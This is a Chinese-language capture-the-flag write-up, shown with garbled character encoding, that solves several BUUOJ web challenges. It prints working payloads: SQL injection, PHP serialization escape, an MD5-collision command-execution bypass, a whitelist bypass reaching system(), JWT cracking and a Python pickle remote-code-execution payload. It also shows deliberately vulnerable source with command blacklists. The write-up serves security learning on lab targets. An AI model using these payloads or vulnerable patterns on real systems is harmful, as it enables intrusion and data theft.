<h4 id="0X09-SWPU2019-Web1"><a href="#0X09-SWPU2019-Web1" class="headerlink" title="0X09:[SWPU2019]Web1"></a>0X09:[SWPU2019]Web1</h4><p>è™šå‡ç™»å½•ç•Œé¢ï¼Œæ³¨å†Œç™»å½•æœ‰ä¸€ä¸ªå‘å¸ƒå¹¿å‘Šï¼Œä¸æ˜¯sqlå°±æ˜¯xssï¼Œç»è¿‡æµ‹è¯•åº”è¯¥æ˜¯sqlï¼Œæµ‹è¯•äº†æŒºä¹…æ²¡æœ‰æ€è·¯ï¼Œæ‰¾äº†wpï¼Œæ˜¯MariaDBçš„sqlæ³¨å…¥</p>
<img src="/2020/05/11/buuoj2/21.png" class="">

<p>è¿‡æ»¤äº†ä»€ä¹ˆè‡ªå·±å»æµ‹è¯•å§ï¼Œç›´æ¥é™„ä¸Špayload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>, (<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/11/buuoj2/22.png" class="">

<h4 id="0X10-å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#0X10-å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="0X10:[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>0X10:[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>functionæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ ¹æ®æç¤ºåœ¨phpinfo()é¡µé¢å¯ä»¥æ‰¾åˆ°æç¤ºï¼Œè®¿é—®ä¸€ä¸‹</p>
<img src="/2020/05/11/buuoj2/23.png" class="">

<p>å¯ä»¥çœ‹åˆ°è‡ªåŠ¨åŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€ä¸èƒ½è¯»å–æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°åº”è¯¥è¦ç”¨åºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸ï¼Œåºåˆ—åŒ–æ—¶ä¼šç»è¿‡ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œè¿‡æ»¤æ‰çš„å­—ç¬¦åœ¨åºåˆ—åŒ–æ•°æ®ä¸­å°±å¯ä»¥å»æ‰ä¸€äº›ä¸å¿…è¦çš„æ•°æ®</p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:â€œuserâ€;s:<span class="number">24</span>:â€œflagflagflagflagflagflagâ€;s:<span class="number">8</span>:â€œ<span class="function"><span class="keyword">function</span>â€</span>;s:<span class="number">59</span>:â€œaâ€;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;<span class="string">";s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;&#125;</span></span><br><span class="line"><span class="string">//ç”±äºæ²¡æœ‰ä¼ img_pathå‚æ•°ï¼Œæºä»£ç ç»™äº†é»˜è®¤çš„å‚æ•°å€¼guest_img.png</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¿‡æ»¤ä¹‹åflagè¢«å»æ‰ï¼Œç©ºå‡ºäº†24ä¸ªå­—ç¬¦å°±ä¼šå¾€åæ‹¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:â€œuserâ€;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:â€œ<span class="function"><span class="keyword">function</span>â€</span>;s:<span class="number">59</span>:â€œaâ€;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;<span class="string">";s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·a:3åˆšå¥½æœ‰ä¸‰ä¸ªé”®å€¼å¯¹ï¼Œåé¢çš„<code>&quot;;s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;}</code>å°±è¢«å»æ‰äº†</p>
<img src="/2020/05/11/buuoj2/24.png" class="">

<p>å†æ”¹ä¸€ä¸‹è¦è¯»å–çš„æ–‡ä»¶base64ç¼–ç </p>
<img src="/2020/05/11/buuoj2/25.png" class="">

<h4 id="0X11-å®‰æ´µæ¯-2019-easy-web"><a href="#0X11-å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="0X11:[å®‰æ´µæ¯ 2019]easy_web"></a>0X11:[å®‰æ´µæ¯ 2019]easy_web</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œåªçœ‹åˆ°äº†ä¸€ä¸ªMD5 is funï¼ŒæŠ“ä¸€ä¸‹åŒ…ï¼Œæ„Ÿè§‰imgå‚æ•°æ¯”è¾ƒå¯ç–‘</p>
<img src="/2020/05/11/buuoj2/26.png" class="">

<p>base64è§£å¯†ä¸¤æ¬¡ï¼Œhexè§£å¯†ä¸€æ¬¡ï¼Œå‘ç°æ˜¯555.pngï¼Œé‚£ä¹ˆindex.phphexåŠ å¯†ï¼Œå†base64åŠ å¯†ä¸¤æ¬¡å¯èƒ½å¯ä»¥è®¿é—®</p>
<p>æˆåŠŸæ‹¿åˆ°æºç ï¼Œå»æ‰äº†éƒ¨åˆ†æ²¡ç”¨çš„ä¸œè¥¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5ç¢°æ’ç›´æ¥å¯ä»¥æ‰¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰çš„è¯»å–æ–¹å¼ï¼Œä¸Šæ¬¡çš„æ¯”èµ›è®°å¾—catå¯ä»¥ç”¨ca\tç»•è¿‡ï¼Œå…·ä½“çš„åŸå› ä¹Ÿæ²¡æœ‰å»æŸ¥æ‰¾èµ„æ–™ï¼Œæœ‰æ—¶é—´å†å¼„ï¼Œè¿™é‡Œç›´æ¥æ‹¿æ¥ç”¨äº†</p>
<img src="/2020/05/11/buuoj2/27.png" class="">

<p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagæ–‡ä»¶ï¼Œç›´æ¥è¯»å–</p>
<img src="/2020/05/11/buuoj2/28.png" class="">

<h4 id="0X12-CISCN-2019-åˆèµ›-Love-Math"><a href="#0X12-CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="0X12:[CISCN 2019 åˆèµ›]Love Math"></a>0X12:[CISCN 2019 åˆèµ›]Love Math</h4><p>æºç å®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ä¸­æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸­æ‹¬å·è¢«banæ‰äº†ï¼Œè¦ç”¨è¿›åˆ¶è½¬æ¢ï¼Œbase_convert ï¼Œdechexï¼Œç¬¬ä¸€ä¸ªå¯ä»¥è¿›è¡Œè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œæ¯”å¦‚ base_convert(â€œ1001â€2,10)æ˜¯å°†äºŒè¿›åˆ¶çš„1001è½¬æ¢ä¸º10è¿›åˆ¶ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å°†10è¿›åˆ¶è½¬æˆ16è¿›åˆ¶ã€‚payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat falg</span><br></pre></td></tr></table></figure>

<p>å†ç”¨è¿›åˆ¶è½¬æ¢ä¸€ä¸‹ï¼Œç”¨ä¸Šä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>

<h4 id="0X13-CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#0X13-CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="0X13:[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>0X13:[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h4><img src="/2020/05/11/buuoj2/29.png" class="">

<p>éœ€è¦æ‰¾åˆ°lv6ï¼Œæ‰‹ç¿»äº†å‡ é¡µï¼Œæ‰¾ä¸åˆ°ï¼Œå†™ä¸ªè„šæœ¬æ¥æ‰¾</p>
<img src="/2020/05/11/buuoj2/30.png" class="">

<p>åœ¨181é¡µï¼Œå¯ä»¥çœ‹åˆ°ä»·æ ¼å¤ªé«˜äº†ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯jsèƒ½åšä¿®æ”¹ï¼Œå‘ç°discountçš„å€¼èƒ½æ”¹ï¼Œæ”¹æˆä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œæç¤ºéœ€è¦ä¸ºadminæ‰èƒ½è®¿é—®ï¼Œåœ¨cookieé‡Œæ‰¾åˆ°äº†jwtï¼Œæ”¾åˆ°jwt.io</p>
<img src="/2020/05/11/buuoj2/31.png" class="">

<p>éœ€è¦è®©usernameä¸ºadminï¼Œè¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªç ´è§£å·¥å…·jwtcrack<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<img src="/2020/05/11/buuoj2/32.png" class="">

<p>å¼„åˆ°äº†å¯†é’¥ï¼Œå°±èƒ½å¤Ÿæ›´æ”¹å¾—åˆ°éœ€è¦çš„jwtäº†ï¼Œå†ä¿®æ”¹cookieï¼Œæç¤ºè¦æˆä¸ºå¤§ä¼šå‘˜ï¼Œå†æºç å¤„å‘ç°äº†<a href="http://www.zipæ–‡ä»¶ï¼Œä¸‹è½½è¿‡æ¥æ˜¯ä¸€å †pythonæ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†æœ‰å…³åºåˆ—åŒ–çš„ä»£ç " target="_blank" rel="noopener">www.zipæ–‡ä»¶ï¼Œä¸‹è½½è¿‡æ¥æ˜¯ä¸€å †pythonæ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†æœ‰å…³åºåˆ—åŒ–çš„ä»£ç </a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰¾äº†pythonåºåˆ—åŒ–èµ„æ–™ï¼Œè¯´æ˜¯pythonååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ï¼Œé‡å†™<em>reduce</em>()é­”æœ¯æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))    <span class="comment">#æ‰“å¼€è¯»å–flag.txtçš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  <span class="comment">#åºåˆ—åŒ–payload</span></span><br><span class="line">a = urllib.quote(a)  <span class="comment">#è¿›è¡Œurlç¼–ç </span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A. è¿è¡Œç»“æœ</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹becomeå€¼å³å¯</p>
<img src="/2020/05/11/buuoj2/33.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>[å®‰æ´µæ¯2019]iamthinking</title>
    <url>/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/</url>
    <content><![CDATA[<p>å¼€é¢˜ï¼Œæ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œå°è¯•è®¿é—®/publicè·¯å¾„ï¼Œåªæ˜¾ç¤ºå‡ºæ¥ä¸€å¼ å›¾ç‰‡<a id="more"></a></p>


<p>æ‰«æç›®å½•ï¼Œå‘ç°äº†æœ‰éšè—æ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œ<a href="http://www.zipï¼Œæ‰“å¼€ï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­æ‰¾åˆ°æ˜¯thinkphp" target="_blank" rel="noopener">www.zipï¼Œæ‰“å¼€ï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­æ‰¾åˆ°æ˜¯thinkphp</a> v6.0çš„æ¡†æ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='../test.jpg'"</span>.<span class="string">"/&gt;"</span>;</span><br><span class="line">        $paylaod = @$_GET[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($paylaod))</span><br><span class="line">        &#123;</span><br><span class="line">            $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">            parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">            <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/^O/i"</span>,$value))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'STOP HACKING'</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            unserialize($paylaod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

